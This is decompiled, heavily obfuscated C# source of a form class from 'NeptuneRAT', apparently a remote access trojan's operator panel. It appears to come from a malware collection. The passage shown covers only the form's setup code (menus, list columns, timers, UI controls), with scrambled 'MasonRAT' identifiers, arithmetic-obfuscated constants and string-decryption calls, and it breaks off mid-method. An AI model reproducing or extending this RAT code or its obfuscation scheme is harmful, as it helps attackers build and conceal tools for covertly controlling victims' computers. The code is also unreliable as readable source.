// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.FM
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace NeptuneRAT;

[DesignerGenerated]
public class FM : Form
{
  private IContainer \u2694️MasonRAT\u270C̨ۡۨ\u060D\u060A\u060Eمـﻻ\u0609حٺۙ\u060A\u060C;
  public Client \u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ;
  public string \u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ;
  public string \u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A;

  public FM()
  {
    this.Load += new EventHandler(this.\u2694️MasonRAT\u270Cـٸﮪڙٺﻻ̍\u0608طﻋـؤۏ);
    this.FormClosing += new FormClosingEventHandler(this.\u2694️MasonRAT\u270Cـۚ\u060Bۏ̍ۨ\u0609ۛ\u060Dـ\u060B\u0608دټٺــ);
    this.Resize += new EventHandler(this.\u2694️MasonRAT\u270Cـ\u060Fـڙ\u060Aد\u0608بٻــٺـ\u060D\u060Fٸدۡ);
    this.\u2694️MasonRAT\u270C\u060F̍ڼ\u0608\u060D̍ـــﻋؤڙ\u0608ـټ\u0608ـڙ();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.\u2694️MasonRAT\u270C̨ۡۨ\u060D\u060A\u060Eمـﻻ\u0609حٺۙ\u060A\u060C == null)
        return;
      this.\u2694️MasonRAT\u270C̨ۡۨ\u060D\u060A\u060Eمـﻻ\u0609حٺۙ\u060A\u060C.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void \u2694️MasonRAT\u270C\u060F̍ڼ\u0608\u060D̍ـــﻋؤڙ\u0608ـټ\u0608ـڙ()
  {
    this.\u2694️MasonRAT\u270C̨ۡۨ\u060D\u060A\u060Eمـﻻ\u0609حٺۙ\u060A\u060C = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FM));
    this.\u2694️MasonRAT\u270Cـڛٽ̨ـڙ\u060F\u060E\u060Aـئﻻ̍ــﻻﻻة\u060A\u0608 = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ = new MenuStrip();
    this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ = new ImageList(this.\u2694️MasonRAT\u270C̨ۡۨ\u060D\u060A\u060Eمـﻻ\u0609حٺۙ\u060A\u060C);
    this.\u2694️MasonRAT\u270C\u0608ــ\u0609\u060Fـــ\u060Cڙڙ\u0020̍\u060F = new ColumnHeader();
    this.\u2694️MasonRAT\u270C\u0608ــح\u0609ڼـڞٸـئژـ = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ = new ListView();
    this.\u2694️MasonRAT\u270C\u060Fۜ\u060Fڼـ\u0609ـ\u0609ـۡٺـڟ\u060E\u0609\u060A = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cــگۡ\u060Dـحﻼـ\u0609ـ = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cــۜڙ\u0608ټط\u0608\u0020\u060C\u0020ڙ\u060Aـاط\u0609د\u060C\u060A = new ColumnHeader();
    this.\u2694️MasonRAT\u270C\u0020ـ\u060Fـةڞټ\u0608\u060B\u060B\u0609\u060A\u0609 = new ColumnHeader();
    this.\u2694️MasonRAT\u270C\u060Dۙــ\u060Dب\u060Aڠ̍ـئ = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cـدڙﻋب\u060Eـۏْڙـۛۡـةﻻـ\u060C̍ = new ColumnHeader();
    this.\u2694️MasonRAT\u270C\u060Dــ\u0608̍ڙ̍ح\u060Fـﻋﻋـۡ\u060B\u060F\u060Aـۚ\u060D = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد = new Guna2ContextMenuStrip();
    this.\u2694️MasonRAT\u270Cٺ\u0609\u0608ـٸـڇ\u060Dٸۡـــٻـٺــْ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u0608ڙ\u0608ـٽ\u060E\u0609ـب\u060Aمـڛـ\u060A\u0608ـٽ\u060A = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u060Eم\u0609ءڦ\u0609ٻۡد\u0608\u060A = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cــ\u060Dڝـژۚ\u060Cڇ\u060Fڣ\u060Dب\u060Aۧ\u060F\u060A = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cحطبـڙﻋ\u060Eۛ\u060Eﻻـ\u060Dٸ\u060B\u0609؁ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cڅ\u060Cـۡـڕــﻋـــ\u060F = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cڠـڙـۙ\u060Eـۙﮪم\u0020\u0608ﻋ\u0608\u060Aٸٻ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cـڙ\u060Aڇـب\u060Bــٽء = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cژﻼ\u060D\u060D\u060E\u0608ٽــ\u060B = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cـ̍ح\u060Eـ\u060Dـ\u060Aڞ\u060Eٻڇـ\u0020\u060B̨\u0608̍ٺ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cۨـ\u060Aــٺگــ\u060A\u0608ـ\u060Fڛﻼ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u060Fـ\u0608د\u060A\u060Aـ\u060A\u0608\u060Dـــڇۨﻋـ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cـڙ\u060D\u060A\u0609\u0609ﻻټ\u060Aاٺڙـۧڼ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u060F\u060Dـڇْحـ\u060Bـ̍ٸ\u060C\u0020\u0608 = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cڅ\u0608ۡـۧۡ\u060Eـ\u0608ئ\u0608\u060Aدﻋ\u060Bڙ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cټ\u060Aــ\u0609\u0608\u060Eٸ\u060A\u060Cـۧءﻻ\u0608ڙڙ\u060Aڙ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cؤ\u060Fـ\u060A\u0608ح\u0020ڇـ\u0608ـۜٺـڙگى\u0609\u060F = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cـــ\u060Aـۛـ\u0609ٺــ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u060A\u0608\u060Fٻ̍\u060Aـح\u0608ﻼڟ\u060B = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u060A\u060Aـۜــٺ\u0609ٺـ\u060Fة = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u0020\u0608\u060Fۙﯧژــْـ\u060Dڦ\u0608ب\u060Dٽ\u060F = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u060Dٸڕ\u0609ۡ\u0608ـح\u0609طڙ\u060Fۙڙ\u060Eټـ\u060Aـ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cڙ\u060Bـ؁ــ\u060F\u060Aح\u060A\u0608̍\u060A = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة = new PictureBox();
    this.\u2694️MasonRAT\u270C\u060Dةـ\u060Fڠۧـڙٺئۙﻋ = new Timer(this.\u2694️MasonRAT\u270C̨ۡۨ\u060D\u060A\u060Eمـﻻ\u0609حٺۙ\u060A\u060C);
    this.\u2694️MasonRAT\u270C\u0608ۙ؁ڣ\u060E\u0609ڙּڙٽ\u060Dــؤڟـ̍ = new Guna2Elipse(this.\u2694️MasonRAT\u270C̨ۡۨ\u060D\u060A\u060Eمـﻻ\u0609حٺۙ\u060A\u060C);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A = new Guna2CustomGradientPanel();
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ = new Guna2ResizeBox();
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ = new Guna2GroupBox();
    this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609 = new Guna2GradientButton();
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ = new Guna2TextBox();
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608 = new Guna2ControlBox();
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ = new Guna2ControlBox();
    this.\u2694️MasonRAT\u270Cﻋټـــ\u060Fڅڇـءـۙ\u0608ڙۡ\u060Cٸۧۨ\u0608 = new Guna2DragControl(this.\u2694️MasonRAT\u270C̨ۡۨ\u060D\u060A\u060Eمـﻻ\u0609حٺۙ\u060A\u060C);
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.SuspendLayout();
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.SuspendLayout();
    ((ISupportInitialize) this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة).BeginInit();
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.SuspendLayout();
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.SuspendLayout();
    this.SuspendLayout();
    this.\u2694️MasonRAT\u270Cـڛٽ̨ـڙ\u060F\u060E\u060Aـئﻻ̍ــﻻﻻة\u060A\u0608.BackColor = Color.White;
    this.\u2694️MasonRAT\u270Cـڛٽ̨ـڙ\u060F\u060E\u060Aـئﻻ̍ــﻻﻻة\u060A\u0608.ForeColor = Color.Black;
    this.\u2694️MasonRAT\u270Cـڛٽ̨ـڙ\u060F\u060E\u060Aـئﻻ̍ــﻻﻻة\u060A\u0608.Image = (Image) NeptuneRAT.My.Resources.Resources.\u2694️MasonRAT\u270Cـ\u060Dژ\u060D\u060A\u0608\u0609ـ\u060Cژ;
    this.\u2694️MasonRAT\u270Cـڛٽ̨ـڙ\u060F\u060E\u060Aـئﻻ̍ــﻻﻻة\u060A\u0608.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 146);
    this.\u2694️MasonRAT\u270Cـڛٽ̨ـڙ\u060F\u060E\u060Aـئﻻ̍ــﻻﻻة\u060A\u0608.Size = new Size((1899219780 - 1899219723 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0 ^ (866644566 ^ 866644563 % 1140837971) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, 20);
    this.\u2694️MasonRAT\u270Cـڛٽ̨ـڙ\u060F\u060E\u060Aـئﻻ̍ــﻻﻻة\u060A\u0608.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 147);
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.BackColor = Color.Black;
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.Dock = DockStyle.None;
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.Items.AddRange(new ToolStripItem[1]
    {
      (ToolStripItem) this.\u2694️MasonRAT\u270Cـڛٽ̨ـڙ\u060F\u060E\u060Aـئﻻ̍ــﻻﻻة\u060A\u0608
    });
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.Location = new Point(((1340117270 > 1909675105 ? -1703854122 : 1943334881) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ ((1724439310 ^ 68695641 % 2104546787) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 | -343609949 - (2005661897 | 305943920) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, 654);
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 148);
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.Size = new Size((406593424 + 1232064331 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 > (643915326 + 275012213 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) ? 898237160 + ~898237091 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 : -698584148 - ~698584237 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, 24);
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.TabIndex = ((-136394878 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 ^ -((1524907623 | 767662118) - 2009368051 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0;
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 149);
    this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ.ImageStream = (ImageListStreamer) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 150));
    this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ.TransparentColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ.Images.SetKeyName(0, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 151));
    this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ.Images.SetKeyName(1, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 152));
    this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ.Images.SetKeyName((305004187 > 1285519596 ? -224858842 : -168644132) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 + ((802843072 ^ 11) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) % ((-1641257265 ^ ~1142850197) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 153));
    this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ.Images.SetKeyName((-1905959245 ^ (888662307 | 2080447547)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 + ((1317257481 > 402894394 ? 1316208849 : 1754945132) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) % (1720419894 + (2127812337 << 84332581) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 154));
    this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ.Images.SetKeyName((1214123277 + -286030847 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 > (1060759661 ^ (556555975 | 1001827586)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 ? 130797 - (535731770 >> 1758318924) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 : (22 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 155));
    this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ.Images.SetKeyName(((2047137478 ^ -1086041358) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 ^ ~(1845913098 - 1914702030 % 1054416530 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 156));
    this.\u2694️MasonRAT\u270C\u0608ــ\u0609\u060Fـــ\u060Cڙڙ\u0020̍\u060F.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 157);
    this.\u2694️MasonRAT\u270C\u0608ــ\u0609\u060Fـــ\u060Cڙڙ\u0020̍\u060F.Width = ((1516233427 >> 1342886967) - 2079 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + ((-1270929094 - 936455755 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) >> (1929426687 - 1101015563 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0);
    this.\u2694️MasonRAT\u270C\u0608ــح\u0609ڼـڞٸـئژـ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 158);
